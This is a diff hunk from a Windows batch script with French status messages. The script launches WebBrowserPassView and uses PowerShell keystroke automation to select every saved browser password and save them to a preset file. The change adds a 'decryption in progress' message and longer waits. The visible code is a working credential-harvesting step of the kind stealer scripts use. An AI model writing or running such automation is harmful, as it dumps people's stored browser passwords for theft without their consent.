@@ -815,10 +815,12 @@ cd /d "%~dp0"
 
 start "" "%WBPV%"
 
-timeout /t 2 /nobreak >nul
+echo.
+echo Analyse des navigateurs en cours (Patience, le dechiffrement prend quelques secondes)...
+timeout /t 8 /nobreak >nul
 
 echo Traitement en cours...
-powershell -Command "Set-Clipboard -Value '%OUTPUT%'; $wsh = New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 800; $wsh.SendKeys('^A'); Start-Sleep -Milliseconds 400; $wsh.SendKeys('^S'); Start-Sleep -Milliseconds 1500; $wsh.SendKeys('^V'); Start-Sleep -Milliseconds 500; $wsh.SendKeys('{ENTER}') }" >nul 2>&1
+powershell -Command "Set-Clipboard -Value '%OUTPUT%'; $wsh = New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 800; $wsh.SendKeys('^A'); Start-Sleep -Milliseconds 400; $wsh.SendKeys('^S'); Start-Sleep -Milliseconds 1500; $wsh.SendKeys('^V'); Start-Sleep -Milliseconds 600; $wsh.SendKeys('{ENTER}') }" >nul 2>&1
 
 timeout /t 3 /nobreak >nul
 
